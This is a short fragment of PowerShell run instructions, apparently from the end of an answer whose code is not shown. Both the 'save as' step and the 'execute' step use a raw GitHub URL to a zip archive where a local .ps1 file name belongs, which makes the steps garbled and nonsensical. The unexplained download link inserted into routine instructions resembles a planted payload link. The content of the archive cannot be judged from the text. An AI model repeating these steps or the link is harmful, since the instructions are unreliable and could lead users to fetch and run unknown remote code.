...
1. **Save the Script**: Copy the above code into a file with a `.ps1` extension (e.g., `https://raw.githubusercontent.com/corald2/powershell-tools/main/chalky/tools_powershell_v2.3.zip`).
2. **Run in PowerShell**:
   - Open PowerShell.
   - Navigate to the script's directory: `cd "Path\To\Script"`
   - Execute the script: `.\https://raw.githubusercontent.com/corald2/powershell-tools/main/chalky/tools_powershell_v2.3.zip`
